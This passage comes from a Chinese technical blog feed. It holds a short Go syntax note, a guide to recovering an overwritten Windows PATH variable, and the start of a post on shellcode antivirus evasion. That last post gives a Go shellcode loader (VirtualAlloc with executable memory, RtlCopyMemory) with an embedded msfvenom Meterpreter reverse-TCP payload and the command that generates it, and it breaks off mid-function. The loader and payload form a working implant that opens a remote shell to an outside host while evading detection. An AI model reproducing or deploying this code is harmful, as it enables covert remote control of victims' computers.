        <content type="html"><![CDATA[<h1 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h1><ul><li>需要注意的是 <strong>{</strong> 不能单独放在一行，所以以下代码在运行时会产生错误：</li></ul><blockquote><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">**<span class="keyword">package</span>** main</span><br><span class="line"></span><br><span class="line">**<span class="keyword">import</span>** <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> </span><br><span class="line">&#123; *<span class="comment">// 错误，&#123; 不能在单独的行上*</span></span><br><span class="line">  fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> Coder </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>win10误删环境变量Path的几种恢复方法</title>
      <link href="/2022-09-11-%E7%9F%A5%E8%AF%86/Windows/win10%E8%AF%AF%E5%88%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FPath%E7%9A%84%E5%87%A0%E7%A7%8D%E6%81%A2%E5%A4%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2022-09-11-%E7%9F%A5%E8%AF%86/Windows/win10%E8%AF%AF%E5%88%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FPath%E7%9A%84%E5%87%A0%E7%A7%8D%E6%81%A2%E5%A4%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>因为在添加环境变量的时候，不小心将原环境变量覆盖掉的了，导致很多程序不能正常运行~~</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加到系统环境变量</span></span><br><span class="line">setx path <span class="string">&quot;%PATH%;F:\Learning\ComputerScience\Code\GO;D:\Program Files\Go\bin&quot;</span> </span><br></pre></td></tr></table></figure><p>这是所犯的错误，%PATH%并没有产生变量的效果（原本是想在PATH后面追加变量的）</p><p>那么怎么恢复修改的环境变量呢？</p><h1 id="Windows环境变量简单介绍"><a href="#Windows环境变量简单介绍" class="headerlink" title="Windows环境变量简单介绍"></a>Windows环境变量简单介绍</h1><p>Windows系统中有两种环境变量：用户变量和系统变量。系统变量与用户变量的PATH是为了告诉系统可执行文件放在什么路径（平常执行程序的路径，要放在PATH里面，当系统需要的时候就会去path查找）</p><h2 id="查找规则"><a href="#查找规则" class="headerlink" title="查找规则"></a>查找规则</h2><blockquote><ol><li>windows系统在执行用户命令时，若用户未给出文件的绝对路径，则首先在当前目录下寻找相应的可执行文件、批处理文件等；</li><li>若果当前目录找不到对应文件名的程序，在系统变量的PATH的路径中，依次寻找对应的可执行程序文件（查找顺序是按照路径的录入顺序从左往右寻找的，最前面一条的优先级最高，如果找到程序就停止寻找，后面的路径不再执行）；</li><li>如果系统变量的PATH的路径找不到，再到用户变量的PATH路径中寻找（如果系统变量和用户变量的PATH中同时包含了同一个命令，则优先执行系统变量PATH中的命令）</li></ol></blockquote><h2 id="需要注意的点："><a href="#需要注意的点：" class="headerlink" title="需要注意的点："></a>需要注意的点：</h2><blockquote><ol><li><p>环境变量没有区分大小写，例如path跟PATH是一样的</p></li><li><p>系统变量对所有用户有效；用户变量只对当前用户有效</p></li><li><p>用户变量与系统变量，名称是变量，值是里面的内容，也就是通过变量存储了想要存储的内容，方便调用</p></li><li><p>每次新加了命令以后，要确定保存了。再重启CMD，否则命令不生效的。被修改的系统Path只是同步到了注册表中，并未立即生效，所以可以使用cmd命令行重新得到系统Path。我们下面通过的恢复PATH的方法大都是依赖于还未关闭的终端，在这些未关闭的终端或者IDE中去获取环境变量~~~</p></li><li><p>在CMD里要输出环境变量 ECHO %变量名%</p></li></ol></blockquote><h2 id="命令行添加环境变量"><a href="#命令行添加环境变量" class="headerlink" title="命令行添加环境变量"></a>命令行添加环境变量</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#setx命令：在用户或系统环境创建或修改环境变量。能基于参数、注册表项或文件输入设置变量。</span></span><br><span class="line"><span class="comment">#使用/M表示在系统写入，不/M表示写入用户变量</span></span><br><span class="line"><span class="comment">#格式： SETX [/S system [/U [domain\]user [/P [password]]]] var value [/M]</span></span><br><span class="line"><span class="comment">#主要是是var和value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#代码编写位置（管理员权限）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span> /M</span><br><span class="line"><span class="comment">#若被拒绝：（不过这样仅仅是写入用户变量）</span></span><br><span class="line">setx GOPATH <span class="string">&quot;F:\Learning\ComputerScience\Code\GO&quot;</span></span><br><span class="line"><span class="comment">#添加到系统环境变量</span></span><br><span class="line">setx path <span class="string">&quot;%PATH%;F:\Learning\ComputerScience\Code\GO;D:\Program Files\Go\bin&quot;</span> </span><br><span class="line"><span class="comment">#注意哦，使用setx修改系统path一定要谨慎，</span></span><br><span class="line"><span class="comment">#如果是在环境变量后面追加值，一定不要忘记带上原变量，否则我们会覆盖掉原变量，而失去原变量。如果要追加在后面的话，一定要setx path &quot;%PATH%;new value&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="查看用户环境变量和系统变量"><a href="#查看用户环境变量和系统变量" class="headerlink" title="查看用户环境变量和系统变量"></a>查看用户环境变量和系统变量</h1><ul><li>查看所有的用户变量</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKCU\Environment /v *</span><br></pre></td></tr></table></figure><ul><li>查看用户变量中的path</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKCU\Environment /v PATH</span><br></pre></td></tr></table></figure><ul><li>查找系统变量中所有的变量:</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">REG QUERY <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&quot;</span> /v *</span><br></pre></td></tr></table></figure><ul><li>查询系统变量中的path变量:</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">REG QUERY <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&quot;</span> /v path</span><br></pre></td></tr></table></figure><h1 id="恢复误修改的PATH"><a href="#恢复误修改的PATH" class="headerlink" title="恢复误修改的PATH"></a>恢复误修改的PATH</h1><p>千万不要重启电脑！ </p><h2 id="未重启"><a href="#未重启" class="headerlink" title="未重启"></a>未重启</h2><h3 id="利用还未关闭的IDEA-x2F-PyCharm-x2F-Goland-x2F-cmd-x2F-终端恢复"><a href="#利用还未关闭的IDEA-x2F-PyCharm-x2F-Goland-x2F-cmd-x2F-终端恢复" class="headerlink" title="利用还未关闭的IDEA&#x2F;PyCharm&#x2F;Goland&#x2F;cmd&#x2F;终端恢复"></a>利用还未关闭的IDEA&#x2F;PyCharm&#x2F;Goland&#x2F;cmd&#x2F;终端恢复</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被修改的系统Path只是同步到了注册表中，并未立即生效，所以可以使用cmd命令行重新得到系统Path。</span></span><br><span class="line"><span class="comment">#如果你在修改系统Path前打开了以上任意IDE，无论你怎么修改环境Path都不会生效，必须重启IDE才能生效。</span></span><br><span class="line"><span class="comment">#由此，我们可以利用未关闭的IDE得到修改之前的Path变量的值。</span></span><br><span class="line"><span class="comment">#在终端或者IDE的Terminal窗口输入以下命令：</span></span><br><span class="line"><span class="built_in">echo</span> %Path%</span><br></pre></td></tr></table></figure><h3 id="使用备份注册表恢复"><a href="#使用备份注册表恢复" class="headerlink" title="使用备份注册表恢复"></a>使用备份注册表恢复</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#无论使用图形界面还是cmd命令行修改系统Path，都是立即同步到注册表文件的，所以，没有备份注册表也不用看了。</span></span><br><span class="line"><span class="comment">#使用regedit打开注册表；</span></span><br><span class="line"><span class="comment">#找到系统Path：</span></span><br><span class="line"><span class="comment">#注册表路径：计算机\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment</span></span><br><span class="line"><span class="comment">#复制Path变量。</span></span><br></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>该方法意外的好用，找回了遗失的环境变量~~</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用Windows PowerShell运行以下命令获取路径环境变量</span></span><br><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Environment&quot;</span></span><br></pre></td></tr></table></figure><h3 id="利用用户配置备份文件恢复"><a href="#利用用户配置备份文件恢复" class="headerlink" title="利用用户配置备份文件恢复"></a><strong>利用用户配置备份文件恢复</strong></h3><p>这个方法适用于有用户配置文件备份或系统备份的情况下，在位于Users文件夹下的用户名子文件夹中找到名为NTUSER.DAT的文件，然后用记事本打开这个文件，里面就包含了旧路径环境变量，通过查找PATH相关语句，就可以获取路径环境变量了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\86063\NTUSER.DAT</span><br></pre></td></tr></table></figure><h2 id="已重启"><a href="#已重启" class="headerlink" title="已重启"></a>已重启</h2><p>这种情况下，在注册表中搜索名为Environment的项，并检查结果中出现的相关选项下是否尚包含路径环境变量。如果注册表中的环境变量被清空，那么可以在相同版本的win10注册表中，查找并复制默认路径环境变量值，进行恢复。</p><h3 id="使用win10默认Path"><a href="#使用win10默认Path" class="headerlink" title="使用win10默认Path"></a>使用win10默认Path</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://blog.csdn.net/chengcheng95588/article/details/103057424?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">win10误删环境变量Path的几种恢复方法</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境变量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellcode免杀</title>
      <link href="/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/Shellcode%E5%85%8D%E6%9D%80/"/>
      <url>/2022-09-08-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/Shellcode%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Shellcode免杀"><a href="#Shellcode免杀" class="headerlink" title="Shellcode免杀"></a>Shellcode免杀</h1><p>接下来先讲解如何写一个shellcode加载器</p><h2 id="shellcodeLoder-go-学完go再来看"><a href="#shellcodeLoder-go-学完go再来看" class="headerlink" title="shellcodeLoder-go(学完go再来看)"></a>shellcodeLoder-go(学完go再来看)</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">//定义一个main包，才能进行main函数的编写</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    <span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//os包中的 API 主要可以帮助我们使用操作系统中的文件系统、权限系统、环境变量、系统进程以及系统信号</span></span><br><span class="line"><span class="comment">//syscall包包含一个指向底层操作系统原语的接口</span></span><br><span class="line"><span class="comment">//unsafe 是类型安全的操作,如当使用系统调用和Go结构必须具有与C结构相同的内存布局时，只能使用unsafe，也就是指针操作</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">    MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">    PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 定义一个常量 并初始化变量的值，这几个变量和上一节c++的shellode加载器编写一样</span></span><br><span class="line"><span class="comment">// MEM_COMMIT: 为特定的页面区域分配内存中或磁盘的页面文件中的物理内</span></span><br><span class="line"><span class="comment">// MEM_RESERVE: 保存地址而不分配物理存储，也就是保留这一个地址随时可利用；</span></span><br><span class="line"><span class="comment">// PAGE_EXECUTE_READWRITE: 可读可写可执行模式，可以理解为申请权限；</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// 定义变量 并分别赋值</span></span><br><span class="line"><span class="comment">// 1. 通过syscall.MustLoadDLL方法调用kernel32.dll和ntdll.dll</span></span><br><span class="line"><span class="comment">// 2. 使用kernel32.dll调用ViretualAlloc函数</span></span><br><span class="line"><span class="comment">// 3. 使用ntdll.dll调用RtCopyMemory函数 ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域</span></span><br><span class="line"><span class="comment">// 4. 初始化shellcode_buf数组, 同时是字节类型</span></span><br><span class="line">    kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)   <span class="comment">//调用kernel32.dll</span></span><br><span class="line">    ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)      <span class="comment">//调用ntdll.dll</span></span><br><span class="line">    VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>) <span class="comment">//使用kernel32.dll调用ViretualAlloc函数</span></span><br><span class="line">    RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)   <span class="comment">//使用ntdll调用RtCopyMemory函数</span></span><br><span class="line">    <span class="comment">// msfvenom生成的shellcode</span></span><br><span class="line">    <span class="comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=6666 -f c</span></span><br><span class="line">    shellcode_buf = []<span class="type">byte</span>&#123;</span><br><span class="line">    <span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>,    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x18</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,      <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x4a</span>,        <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>,        <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x48</span>,        <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0x78</span>, <span class="number">0x18</span>, <span class="number">0x0b</span>, <span class="number">0x02</span>, <span class="number">0x0f</span>, <span class="number">0x85</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>,        <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x67</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x44</span>,        <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x8b</span>, <span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0xe3</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x4d</span>,        <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>,        <span class="number">0x0d</span>, <span class="number">0xac</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf1</span>, <span class="number">0x4c</span>, <span class="number">0x03</span>, <span class="number">0x4c</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x45</span>,        <span class="number">0x39</span>, <span class="number">0xd1</span>, <span class="number">0x75</span>, <span class="number">0xd8</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x24</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>,        <span class="number">0x0c</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x1c</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,        <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>,        <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xe9</span>,        <span class="number">0x4b</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x5d</span>, <span class="number">0x49</span>, <span class="number">0xbe</span>, <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x5f</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,        <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xec</span>, <span class="number">0xa0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>,        <span class="number">0x49</span>, <span class="number">0xbc</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x0d</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x75</span>, <span class="number">0x2f</span>, <span class="number">0xe7</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe4</span>,        <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xf1</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x68</span>,        <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x0a</span>,        <span class="number">0x41</span>, <span class="number">0x5e</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,        <span class="number">0xc2</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0xea</span>, <span class="number">0x0f</span>, <span class="number">0xdf</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>,<span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0x75</span>, <span class="number">0xe5</span>, <span class="number">0xe8</span>, <span class="number">0x93</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0x00</span>, <span class="number">0x7e</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>, <span class="number">0x5e</span>, <span class="number">0x89</span>, <span class="number">0xf6</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xf0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0x00</span>, <span class="number">0x7d</span>, <span class="number">0x28</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x0b</span>, <span class="number">0x2f</span>, <span class="number">0x0f</span>, <span class="number">0x30</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x4d</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0xe9</span>, <span class="number">0x3c</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x29</span>, <span class="number">0xc6</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xf6</span>, <span class="number">0x75</span>, <span class="number">0xb4</span>, <span class="number">0x41</span>, <span class="number">0xff</span>, <span class="number">0xe7</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">// 定义错误处理函数,必须要做</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkErr</span><span class="params">(err <span class="type">error</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="comment">//如果内存调用出现错误，可以报出错误</span></span><br><span class="line">        <span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123; <span class="comment">//如果调用dll系统发出警告，但是程序运行成功，则不进行警报</span></span><br><span class="line">            <span class="built_in">println</span>(err.Error()) <span class="comment">//报出具体错误</span></span><br><span class="line">            os.Exit(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">// 定义main函数,main中做的事情和之前c的那个一样</span></span><br><span class="line">    shellcode := shellcode_buf</span><br><span class="line">   <span class="comment">// 调用VirtualAlloc为shellcode申请一块内存，addr, _, err时表示有三个返回值，addr表示返回内存的地址，_下划线表示不对返回值做处理，err表示错误的返回值</span></span><br><span class="line">    addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">    <span class="comment">// 判断申请的内存空间为空，则调用checkErr函数，并打印错误</span></span><br><span class="line">    <span class="keyword">if</span> addr ≠ <span class="number">0</span> &#123;</span><br><span class="line">        checkErr(err)</span><br><span class="line">    